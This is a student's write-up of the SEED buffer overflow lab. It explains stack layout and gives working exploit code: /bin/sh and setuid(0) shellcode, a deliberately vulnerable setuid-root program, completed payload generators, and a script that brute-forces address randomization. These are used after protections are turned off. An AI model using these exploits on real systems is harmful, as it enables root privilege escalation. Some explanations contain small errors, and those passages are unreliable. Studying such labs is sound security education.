---
title: Buffer-Overflow 
date: 2020-01-24 23:30:46 

tags: [Security]
categories: [Security]
toc: true
comments: true
---

![](images/Buffer-Overflow/Platform-SEEDUbuntu16__04--32bit-green-1580309680099.svg) ![](images/Buffer-Overflow/SEED-SoftwareSecurityLab-brightgreen.svg) ![](images/Buffer-Overflow/Lab--1-BufferOverflowVulnerability-yellowgreen.svg)

>This is a report about SEED Software Security lab, Buffer Overflow Vulnerability Lab. 
>
>Written by Simon Nie.
>
>The main knowledge involved:
>
>•  Buffer overflow vulnerability and attack
>
>•  Stack layout in a function invocation
>
>•  Shell code
>
>•  Address randomization
>
>•  Non-executable stack
>
>•  Stack Guard

Table of Contents
=================


* [Preparation: Some Useful Knowledge](#preparation-some-useful-knowledge)
	* [1. Memory Layout:](#1-memory-layout)
	* [2. Virtual Address vs Physical Address](#2-virtual-address-vs-physical-address)
    * [3. Stack Layout](#3-stack-layout)
    * [4. Frame Pointer and Function Call Chain](#4-frame-pointer-and-function-call-chain)
    * [5. Copy Data to Buffer](#5-copy-data-to-buffer)
    * [6. Turning Off Countermeasures](#6-turning-off-countermeasures)
        * [6.1 Address Space Randomization](#61-address-space-randomization)
        * [6.2 Th Stack Guard Protection Scheme](#62-the-stack-guard-protection-scheme)
        * [6.3 Non-Executable Stack](#63-non-executable-stack)
        * [6.4 Configuring/bin/sh(Ubuntu 16.04 VM only)](#64-configuringbinshubuntu-1604-vm-only)
* [Task 1: Running Shell code](#task-1-running-shell-code)
* [Task 2: Exploiting the Vulnerability](#task-2-exploiting-the-vulnerability)
    * [Solution 1](#solution-1)
    * [Solution 2:](#solution-2)
    * [Question Unsolved:](#question-unsolved)
* [Task 3: Defeating dash’s Countermeasure](#task-3-defeating-dashs-countermeasure)
* [Task 4: Defeating Address Randomization](#task-4-defeating-address-randomization)
* [Task 5: Turn on the Stack Guard Protection](#task-5-turn-on-the-stack-guard-protection)
* [Task 6: Turn on the Non-executable Stack Protection](#task-6-turn-on-the-non-executable-stack-protection)
* [Reference](#reference)
## Preparation: Some Useful Knowledge

### 1. Memory Layout:

```markdown
|     Stack    |High address
|              |
|              |
|     Heap     |
| BSS Segment  |
| Data Segment |
| Text Segment |low address
```

1. Global and static variable are stored in Data Segment or BSS Segment, if the value is initialized, it will be put into Data Segment, otherwise it will be put into BSS Segment.
2. BSS Segment, all value will be set Zero. OS will zero out everything in BSS Segment, that's why all uninitialized variable will be set into zero.
3. Local variable will be allocated on the stack. pointers will be allocated in the stack, but where it points at will be allocated on the heap.

### 2. Virtual Address vs Physical Address

1. Every program has its own virtual address. Two different programs can have the same VA, but not the same PA, unless they can share memory.

### 3. Stack Layout

```markdown
|  value of b  |High address
|  value of a  |
|  return addr |
|  Previous Frame Pointer  |
|  value of x  |<---current
|  value of y  |
| Text Segment |low address
```

### 4. Frame Pointer and Function Call Chain

### 5. Copy Data to Buffer

`strcpy(dst, src)` 在拷贝的时候看见`\0`的时候才会停止。

### 6. Turning Off Countermeasures

#### 6.1 Address Space Randomization

Use command below to close address space randomization.

```shell
sudo sysctl -w kernel.randomize_va_space=0
```


#### 6.2 The Stack Guard Protection Scheme

Use command below to disable Stack Guard when compiling a program.

```shell
gcc -fno-stack-protector example.c
```

#### 6.3 Non-Executable Stack

Use command below to choose setting your program can be or not be executable on stack.

```shell
For executable stack:
$ gcc -z execstack  -o test test.c
For non-executable stack:
$ gcc -z noexecstack  -o test test.c
```

#### 6.4 Configuring/bin/sh(Ubuntu 16.04 VM only)

Before the tasks, we need to configure /bin/sh in our virtual machine.

```shell
$ sudo rm /bin/sh$ sudo ln -s /bin/zsh /bin/sh
```



## Task 1: Running Shell code

Shell Code:

```c
#include <stdio.h>
int main() {
    char*name[2];
    name[0] = "/bin/sh";
    name[1] = NULL;
    execve(name[0], name, NULL);
}
```

**Our target is inject this shell code into the stack, and let the program run these part of code.** For convenience, we have been offered the assembly version of code above. We get a c program below:

```c
/*call_shellcode.c*/
/*You can get this program from the lab’s website*/
/*A program that launches a shell using shellcode*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
const char code[] =
    "\x31\xc0"         /*Line 1:  xorl    %eax,%eax*/
    "\x50"             /*Line 2:  pushl   %eax*/
    "\x68""//sh"       /*Line 3:  pushl   $0x68732f2f*/
    "\x68""/bin"       /*Line 4:  pushl   $0x6e69622f*/
    "\x89\xe3"         /*Line 5:  movl    %esp,%ebx*/
    "\x50"             /*Line 6:  pushl   %eax*/
    "\x53"             /*Line 7:  pushl   %ebx*/
    "\x89\xe1"         /*Line 8:  movl    %esp,%ecx*/
    "\x99"             /*Line 9:  cdq*/
    "\xb0\x0b"         /*Line 10: movb    $0x0b,%al*/
    "\xcd\x80"         /*Line 11: int     $0x80*/
    ;
int main(int argc, char**argv){
    char buf[sizeof(code)];
    strcpy(buf, code);
    ((void(*)( ))buf)( );
}
```

**Before compiling the program, you should do what have been showed in 6.1 and 6.4 above.**

Compile the code using following command:

```shell
gcc -z execstack -o call_shellcode call_shellcode.c
```

Then you can run call_shellcode to learn about this.



##  Task 2: Exploiting the Vulnerability

In this task, we will exploit the vulnerability of `strcpy(dest, src)`, it has a drawback as we introduced in  5, Preparation Part. It can lead a buffer overflow vulnerability.

So we need a program that holds such vulnerability: 

```c
/*Vunlerable program: stack.c*/
/*You can get this program from the lab’s website*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
int bof(char*str){
    char buffer[24];
    /*The following statement has a buffer overflow problem*/
    strcpy(buffer, str);
    return 1;
}
int main(int argc, char**argv){
    char str[517];
    FILE*badfile;
    badfile = fopen("badfile", "r");
    fread(str, sizeof(char), 517, badfile);
    bof(str);
    printf("Returned Properly\n");
    return 1;
}
```

See this program, it does own potential risk of buffer overflow, but to exploit this vulnerability, we need to do some work first:

1. compile it with `-fno-stack-protector` and `-z execstack` to turn off the StackGuard and the non-executable stack protections.
2. make it a root-owned Set-UID program.
3. Change the permission of this program.

You can **finish your work by commands below:**

```shell
$ gcc -o stack -z execstack -fno-stack-protector stack.c
$ sudo chown root stack
$ sudo chmod 4755 stack
```

So now we have a bomb, next we need to inject our dirty code into the bomb so that it will be triggered automatically.

The **core idea** is:

1. inject dirty code into stack.
2. find the position in which the return address is stored.
3. modify the value in the position so that the next instruction it supposed to execute will be leading to our injected dirty code.

To inject the dirty code, we are offered a program again:

```c
/*exploit.c*/
/*A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
char shellcode[] =
    "\x31\xc0"         /*Line 1:  xorl    %eax,%eax*/
    "\x50"             /*Line 2:  pushl   %eax*/
    "\x68""//sh"       /*Line 3:  pushl   $0x68732f2f*/
    "\x68""/bin"       /*Line 4:  pushl   $0x6e69622f*/
    "\x89\xe3"         /*Line 5:  movl    %esp,%ebx*/
    "\x50"             /*Line 6:  pushl   %eax*/
    "\x53"             /*Line 7:  pushl   %ebx*/
    "\x89\xe1"         /*Line 8:  movl    %esp,%ecx*/
    "\x99"             /*Line 9:  cdq*/
    "\xb0\x0b"         /*Line 10: movb    $0x0b,%al*/
    "\xcd\x80"         /*Line 11: int     $0x80*/
    ;
void main(int argc, char**argv){
    char buffer[517];
    FILE*badfile;
    /*Initialize buffer with 0x90 (NOP instruction)*/
    memset(&buffer, 0x90, 517);
    /*You need to fill the buffer with appropriate contents here*/
    /*... Put your code here ...*/
    /*Save the contents to the file "badfile"*/
    badfile = fopen("./badfile", "w");
    fwrite(buffer, 517, 1, badfile);
    fclose(badfile);
}
```

It's easy to understand what the program do: generate a `badfile` for `stack` program we have compiled before to use as its input file. And this `exploit.c` program will do some interesting things in `badfile` to make it a read 'bad file'.

**What we need do is complete the `exploit.c` file and let it generate 'correct'(i mean real bad) file so that we can trig the bomb.**

### Solution 1

To complete the program, we need to use `gdb` to analyze the stack of the `stack` program.

```shell
gdb stack
break main
run
# when it comes to sub esp, 0x214
# it must be the start of char str[517]
stepi
```

so we get the address of str_start :`0xbfffeb30`; 

use `disasemble bof` we can find

```shell
gdb-peda$ disassemble bof
Dump of assembler code for function bof:
   0x080484bb <+0>:	push   ebp
   0x080484bc <+1>:	mov    ebp,esp
   0x080484be <+3>:	sub    esp,0x28
   0x080484c1 <+6>:	sub    esp,0x8
   0x080484c4 <+9>:	push   DWORD PTR [ebp+0x8]
   0x080484c7 <+12>:	lea    eax,[ebp-0x20]
   0x080484ca <+15>:	push   eax
   0x080484cb <+16>:	call   0x8048370 <strcpy@plt>
   0x080484d0 <+21>:	add    esp,0x10
   0x080484d3 <+24>:	mov    eax,0x1
   0x080484d8 <+29>:	leave  
   0x080484d9 <+30>:	ret 
```

before calling the `bof()`, the program push the only parameter into stack(the str[] start address); and then push return address into stack; then coming into the `bof` function; push old ebp into stack; ebp -> new ebp; esp -= 0x28; so the stack will looks like:

```markdown
|    ...		  |high address
|   str addr	  |<- old esp
|	ret addr	  |
|   old edp	      |
|    ...          |
|  	 ...  		  |
|buffer start addr|<-esp = old esp -0x28
```

so we can find that **the position of return address = buffer start address + 0x24**, that is where we need to modify.

So we complete the code:

```c
/* exploit.c  */
...
void main(int argc, char **argv)
{
    char buffer[517];
    FILE *badfile;
    /* Initialize buffer with 0x90 (NOP instruction) */
    memset(&buffer, 0x90, 517);
    /* You need to fill the buffer with appropriate contents here */ 
    //fill the shellcode address to buffer+0x24
    strcpy(buffer + 0x100, shellcode);
    strcpy(buffer + 0x24, "\x30\xec\xff\xbf");

    /* Save the contents to the file "badfile" */
    badfile = fopen("./badfile", "w");
    fwrite(buffer, 517, 1, badfile);
    fclose(badfile);
}
```

we fill the shellcode starting at `buffer_address + 0x100`, and fill the start_address(`0xbfffeb30 + 0x100`) into `buffer_address + 0x24`。

After doing this, compile and run.

```shell
gcc -o exploit exploit.c
./exploit
./stack
```

### Solution 2:

```c
unsigned long get_sp(){
    __asm__("movl %esp,%eax");
}
void main(int argc, char **argv){
    char buffer[517];
    FILE *badfile;
    /* Initialize buffer with 0x90 (NOP instruction) */
    memset(&buffer, 0x90, 517);
    /* You need to fill the buffer with appropriate contents here */ 
    //fill shell code into buffer
    long* addr_ptr, addr;
    int offset = 100;
    addr = get_sp() + offset;
    addr_ptr = (long *)buffer;
    for(int i = 0; i < 10; i++)
        *(addr_ptr++) = addr;
    // strcpy(buffer + 100, shellcode);
    memcpy(buffer + sizeof(buffer) - sizeof(shellcode), shellcode, sizeof(shellcode));

    /* Save the contents to the file "badfile" */
    badfile = fopen("./badfile", "w");
    fwrite(buffer, 517, 1, badfile);
    fclose(badfile);
}
```

In this solution we define a function `unsigned long get_sp()` to get the esp value, it's equal to what we do by using gdb.

![](images/Buffer-Overflow/Screenshot%20from%202019-10-21%2010-38-04.png)

### Question Unsolved:

When i tried to **compare two solutions above**, i found that:

1.  In solution 2, substitute `memcpy()` function with `strcpy()` function, it did work on my PC but didn’t work in PC in BZ306 (Received a Segmentation fault). I don’t know why.
2.  When i try to turn on the address randomization, the solution 2 doesn’t work. I expected it work but it did not.

Maybe i need help.

## Task 3: Defeating dash’s Countermeasure

The dash shell in Ubuntu 16.04 drops privileges when it detects that the effective UID does not equal to the real UID. This can be observed from dash program’s change log.  We can see an additional check below, which compares real and effective user/group IDs.

```c
// https://launchpadlibrarian.net/240241543/dash_0.5.8-2.1ubuntu2.diff.gz
// main() function in main.c has following changes:
++ uid = getuid();
++ gid = getgid();
++ /*
++  *To limit bogus system(3) or popen(3) calls in setuid binaries,
++  *require -p flag to work in this situation.++*/
++ if (!pflag && (uid != geteuid() || gid != getegid())) {
++         setuid(uid);
++         setgid(gid);
++         /*PS1 might need to be changed accordingly.*/
++         choose_ps1();
++ }
```

The countermeasure can be defeated. One approach is not to invoke `/bin/sh ` in our shell code; instead, we can invoke another shell program. This approach requires another shell program,such as `zsh` to be present in the system. Another approach is to change the real user ID of the victim process to zero before invoking the `dash` program. We can achieve this by invoking `setuid(0)` before executing `execve()` in the shell code.  In this task, we will use this approach.  We will first change the `/bin/sh` symbolic link, so it points back to/bin/dash:

```shell
$ sudo ln -sf /bin/dash /bin/sh
```

After that, create a new program:

```c
// dash_shell_test.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(){
    char*argv[2];
    argv[0] = "/bin/sh";
    argv[1] = NULL;
    // setuid(0);
    execve("/bin/sh", argv, NULL);
    return 0;
}
```

The above program can be compiled and set up using the following commands.

```shell
$ gcc dash_shell_test.c -o dash_shell_test
$ sudo chown root dash_shell_test
$ sudo chmod 4755 dash_shell_test
```

We need to compile it twice, one with `setuid(0);` commented and one with not commented. And we can find the difference:

![](images/Buffer-Overflow/Screenshot%20from%202019-10-22%2002-02-02.png)

**We can find that with `setuid(0);` not commented, the identity changed from SEED to ROOT.**

For further thinking, we will inject new shell code(similar to task 2) into stack and invoking dash as root. we need change the shell code in `exploit.c` into following code:

```c
char shellcode[] =
    "\x31\xc0"            /*Line 1: xorl     %eax,%eax*/
    "\x31\xdb"            /*Line 2: xorl     %ebx,%ebx*/
    "\xb0\xd5"            /*Line 3: movb     $0xd5,%al*/
    "\xcd\x80"            /*Line 4: int      $0x80*/
    // ---- The code below is the same as the one in Task 2 ---				"\x31\xc0"
    "\x50"
    "\x68""//sh"
    "\x68""/bin"
    "\x89\xe3"
    "\x50"
    "\x53"
    "\x89\xe1"
    "\x99"
    "\xb0\x0b"
    "\xcd\x80"
```

The updated shell code adds 4 instructions:

(1) set `ebx` to zero.

(2) set `eax` to `0xd5` (`0xd5` is `setuid()`'s call number).

(3) execute the system call.

Using this shell code, we can attack on the vulnerable program when `/bin/bash` is linked to `/bin/dash`. Use the above shell code in `exploit.c` and try the attack from Task 2 again, see the difference:

![](images/Buffer-Overflow/Screenshot%20from%202019-10-22%2002-13-24.png)

From the result we can see the user has been changed from SEED to ROOT.



## Task 4: Defeating Address Randomization

On 32-bit Linux machines, stacks only have 19 bits of entropy, which means that the stack base address can have 2^19 = 524,288 possibilities. This number is not high and can be exhausted easily with brute-force approach. So now we gonna try it.

First let's open the address randomization:

```shell
$sudo /sbin/sysctl -w kernel.randomize_va_space=2
```

Then we try the same attack in Task 2, we can find it failed.

Now let's use a shell script to do this for many times.

```bash
#!/bin/bash
SECONDS=0
value=0
while [ 1 ]
	do
	value=$(( $value + 1 ))
	duration=$SECONDS
	min=$(($duration / 60))
	sec=$(($duration % 60))
	echo "$min minutes and $sec seconds elapsed."
	echo "The program has been running $value times so far."
	./stack
done
```

![](images/Buffer-Overflow/Screenshot%20from%202019-10-22%2003-56-32.png)

After trying 244386 times, we succeed. 



## Task 5: Turn on the Stack Guard Protection

Before working on this task, we need to turn off the address randomization.

```shell
$sudo sysctl -w kernel.randomize_va_space=0
```

Recompile the `stack.c` program without `-fno-stack-protector` option. Then execute task 2 again, we find:

![](images/Buffer-Overflow/Screenshot%20from%202019-10-22%2004-04-37.png)

The program was terminated due to stack smashing detected. This is because without the stack guard protection, the stack overflowed.

Actually, in GCC version 4.3.3 and above, Stack Guard is enabled by default. But in early versions, it was disabled by default.



## Task 6: Turn on the Non-executable Stack Protection

Again, before working on this task, turn off the address randomization. In this stack, we recompile our vulnerable program using the `noexecstack` option and retry the attack in Task 2. Use command below:

```shell
$ gcc -o stack -fno-stack-protector -z noexecstack stack.c
```

Then we find,

![](images/Buffer-Overflow/Screenshot%20from%202019-10-22%2004-13-57.png)

It met a segmentation fault. That is because with the option `noexecstack`, the shell code in the stack cannot be execute. So the program cannot go on when it points at the shell code.



## Reference

[1] [SEED Project](https://seedsecuritylabs.org/Labs_16.04/Software/)

[2] [Wikipedia](https://en.wikipedia.beta.wmflabs.org/wiki/Main_Page)